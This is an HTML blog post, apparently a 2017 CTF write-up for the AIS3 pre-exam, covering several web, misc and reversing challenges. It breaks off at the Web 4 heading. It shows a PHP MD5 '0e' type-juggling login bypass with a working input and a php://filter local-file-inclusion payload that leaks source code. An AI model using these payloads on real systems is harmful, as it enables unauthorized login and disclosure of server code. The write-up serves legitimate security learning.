@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Verdana:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.elmo.tw","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Web Crypto Rev Misc    Web 1 Crypto 1 Rev 1 Misc 2   Web 2 Crypto 3  Misc 4   Web 3      Web 4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeups #1: 2017-AIS3-pre-exam">
+<meta property="og:url" content="https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/index.html">
+<meta property="og:site_name" content="Elmo&#39;s writeup">
+<meta property="og:description" content="Web Crypto Rev Misc    Web 1 Crypto 1 Rev 1 Misc 2   Web 2 Crypto 3  Misc 4   Web 3      Web 4">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/2017-07-07-1.png">
+<meta property="og:image" content="https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/2017-07-07-2.png">
+<meta property="article:published_time" content="2017-07-15T15:19:11.000Z">
+<meta property="article:modified_time" content="2021-05-20T09:36:59.214Z">
+<meta property="article:author" content="Elmo Hsiao">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/2017-07-07-1.png">
+
+<link rel="canonical" href="https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Writeups #1: 2017-AIS3-pre-exam | Elmo's writeup</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <script src="/js/src/photoswipe.min.js?v="></script>
+  <script src="/js/src/photoswipe-ui-default.min.js?v="></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Elmo's writeup</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://blog.elmo.tw/2017/07/15/2017-AIS3-pre-exam/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Elmo Hsiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Elmo's writeup">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Writeups #1: 2017-AIS3-pre-exam
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-07-15 23:19:11" itemprop="dateCreated datePublished" datetime="2017-07-15T23:19:11+08:00">2017-07-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2017/07/15/2017-AIS3-pre-exam/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/07/15/2017-AIS3-pre-exam/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <table>
+<thead>
+<tr>
+<th align="center">Web</th>
+<th align="center">Crypto</th>
+<th align="center">Rev</th>
+<th align="center">Misc</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><a href="#web1">Web 1</a></td>
+<td align="center"><a href="#crypto1">Crypto 1</a></td>
+<td align="center"><a href="#rev1">Rev 1</a></td>
+<td align="center"><a href="#misc2">Misc 2</a></td>
+</tr>
+<tr>
+<td align="center"><a href="#web2">Web 2</a></td>
+<td align="center"><a href="#crypto3">Crypto 3</a></td>
+<td align="center"></td>
+<td align="center"><a href="#misc4">Misc 4</a></td>
+</tr>
+<tr>
+<td align="center"><a href="#web3">Web 3</a></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"><a href="#web4">Web 4</a></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h2 id="misc2">Misc 2</h2>
+
+<p>一開始說</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I&#x27;ve sent you something :)</span><br></pre></td></tr></table></figure>
+
+<p>response</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HereItIs: &quot;Uzc0RzMyLnBocA==&quot;</span><br></pre></td></tr></table></figure>
+
+<p>base64 decode: S74G32.php</p>
+<p>Hint: Pikachu likes the color yellow. Do you know what to do now?</p>
+<p>把背景顏色改成黃色</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bgcolor=<span class="string">&quot;yellow&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>get</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;pika&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web1">Web 1</h2>
+
+<p>http status: 304 Not Modified</p>
+<p>quiz.ais3.org:42351 一直被重新導向至 quiz.ais3.org:42351/index.html</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -i https://quiz.ais3.org:42351</span><br></pre></td></tr></table></figure>
+
+<p>get</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;As_Simple_As_Usual&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web2">Web 2</h2>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;source&quot;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;delicia&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;6d386d56781b744d31328faace811444&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;earnest&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;907d82744bb98e956f82077a20cf92d3&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;chaya&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;0c914720b899f04c3522a6a467d23e07&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;carlos&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;4a84296507efdac241f300b4676c8448&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;celine&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;b74f357a8ef07a954ef3c2b780f09309&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;trena&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;d8a7a3e0bee98a1315f1ebeb8a6cabe5&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;otis&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;ca3ace395c61849f13b0a12e939ba101&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;kristyn&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;467bbf3d08f6d7b46a169257d2f1190a&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;meaghan&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;df70b80ddd44e63bc5f4eb3c4f920e77&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;lacresha&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;aaef40f431754fbec001172f0ce714b9&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;alleen&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;6d8fdad086cee23270c45a06362d03e8&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;marketta&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;50da5753695a6ba0514bb38d351cae81&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;charlette&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;3b10f46067c305ba6a10d9d3ca68e56c&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;golda&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;05615438bb05818cf11abb7c4bc12033&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;miki&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;e99a9c9124c6b4e8a7d114c95106cbb1&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;adelaide&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;6197a1a44aac59234fab3c7fdc872b64&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;yung&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;06418dc6dad833585d54e81b340c0a99&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;delcie&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;5f1bc54558e89ad5078ffb56bda5f86b&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;alisia&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;ddc21c265a7536dcf6854f5fd744b2a2&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;vicki&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;6bf94c6f0f5a6fac2c6859bebe2de44f&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;jarrod&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;6f0b8474de3252bfda8177c7f81f5bc8&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;liberty&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;64b73e2569bb43e6d80fffa90327e5d6&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;dani&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;f8aa590cb16d8746d2530f2d6b082e88&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;dillon&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;cb2277c9f695cd4c4d8453b531329c69&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;quinton&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;e322aae4dd7de048f8a5827874dcaa9b&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;caridad&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;edf4bcb49c1bc2e0aa720ad25978de70&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;lucas&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;a551c048a50263748a98a3a914da202d&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;sena&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;0e959146861158620914280512624073&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;deja&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;590aea8ba65098dccb7ee6835039f949&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;fiona&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;8c15dd1dcd59386d2a813eaa9ac01945&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;mechelle&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;ca8087d12f12a9442e1c59942173fa58&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;an&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;cf0d72a68a70e78f78b4b97d0fef7d89&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;chadwick&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;e564ee0a33eedb3cb99a8fa363ff3d39&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;sandi&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;8f92e127efcd049303431724661cc51a&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;leola&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;aa01b9fa4db785a7a4422b069a0777dd&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;enid&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;881592be42a22ae1011ff21bd8da57f9&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;dewitt&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;35646ebd5bb1bdeb05a9989cd4e2317a&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;tamala&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;9e2932b9be2ce2fbe6679c704fa32370&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;madelaine&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;ae9608b773317fb14776a1f03004ed3f&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;ivan&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;2bc7fce377c6a9568afa03d92c902cd7&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;demetrius&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;bbb3778c0359cdb6ea78a9a184396fde&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;nevada&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;a443c85070f9b92c6639f63bf46cf465&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;lawanda&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;04680fefd56ef0b2606e8df32ca7e578&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;nancee&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;9e1bc7ff8116dbb522a1399ef9fbca2a&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;alexia&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;5699f2844f7e41da9cf98aed003be6dd&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;porsha&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;4f38dcc1120d8824de4db6d20c892072&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;edda&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;fe5cc1e65c1e34046d34b6fd325729b6&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;lucy&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;fda2dc38e34f89e3018483fb25d7c471&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;gilbert&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;54ea997a290c9b00f918aa5078f8afa1&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;tamica&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;7a210fab1fda43d6ab88db77a43ef2f2&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="variable">$success</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$db</span> <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>] <span class="keyword">and</span> md5(<span class="variable">$password</span>) == <span class="variable">$row</span>[<span class="string">&quot;password&quot;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;Successful login as <span class="subst">$username</span>. Here&#x27;s your flag: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            <span class="variable">$success</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$success</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>他的判斷是 <code>==</code></p>
+<p>找 0e 開頭的 md5，利用科學記號的關係，判斷時會變成 0 = 0</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;sena&quot;</span>, <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;0e959146861158620914280512624073&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>s1091221200a (md5 =&gt; 0e940624217856561557816327384675)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;Hey!Why_can_you_login_without_the_password???&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web3">Web 3</h2>
+
+<p>因為 about 的 url: quiz.ais3.org:23545/?p=about</p>
+<p>讓我想到 <a href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using php://filter for local file inclusion</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?p=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
+
+<p>get</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAKLy8gZmxhZzE6IEFJUzN7Q3V0ZV9Tbm9vcHlfaXNfYmFjayEhPyE/ISE/fQoKCi8vIGRpc2FibGVkIGZvciBzZWN1cml0eSBpc3N1ZQokYmxhY2tsaXN0ID0gWyJodHRwIiwgImZ0cCIsICJkYXRhIiwgInppcCJdOwpmb3JlYWNoICgkYmxhY2tsaXN0IGFzICYkcykKICAgIHN0cmVhbV93cmFwcGVyX3VucmVnaXN0ZXIoJHMpOwoKJEZST01fSU5DTFVERSA9IHRydWU7CgokcGFnZXMgPSBhcnJheSgKICAgIC8vIGRpc2FibGVkCiAgICAvLyAidXBsb2FkZGRkZGRkIiA9PiAiVXBsb2FkcyIsCiAgICAiYWJvdXQiID0+ICJBYm91dCIKKTsKCmlmIChpc3NldCgkX0dFVFsicCJdKSkKICAgICRwID0gJF9HRVRbInAiXTsKZWxzZQogICAgJHAgPSAiaG9tZSI7CgoKaWYoc3RybGVuKCRwKSA+IDEwMCkKewogICAgZGllKCJwYXJhbWV0ZXIgaXMgdG9vIGxvbmciKTsKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cjw/cGhwCmluY2x1ZGUgImhlYWRlci5waHAiOwppbmNsdWRlICRwIC4gIi5waHAiOwo/Pgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogICAgPHA+wqkgY2VicnVzZnMgMjAxNzwvcD4KPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgo=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>base64 decode</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag1: AIS3&#123;Cute_Snoopy_is_back!!?!?!!?&#125;</span></span><br><span class="line"><span class="comment">// disabled for security issue</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;ftp&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;zip&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> &amp;<span class="variable">$s</span>)</span><br><span class="line">    stream_wrapper_unregister(<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$FROM_INCLUDE</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="rev1">Rev 1</h2>
+
+<p>用 OllyDBG</p>
+<p>F2 下斷點，F8 執行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;h0w d1d y0u s3e it&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web4">Web 4</h2>
+
